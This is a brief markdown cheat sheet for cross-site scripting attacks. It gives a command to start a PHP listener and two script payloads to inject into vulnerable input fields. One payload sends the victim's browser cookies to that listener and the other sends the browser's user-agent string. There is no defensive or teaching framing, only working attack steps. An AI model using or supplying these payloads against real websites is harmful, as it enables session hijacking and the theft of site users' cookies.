## XSS attacks

### run below command first
```
php -S <lcoal_ip>:8000
```

### place below code in vulnerable inputs
get the cookie
```
<script>window.location='<lcoal_ip>:8000/?cookie='+document.cookie</script>
```
get browser type
```
<script>window.location='<lcoal_ip>:8000/?cookie='+navigator.userAgent</script>
```
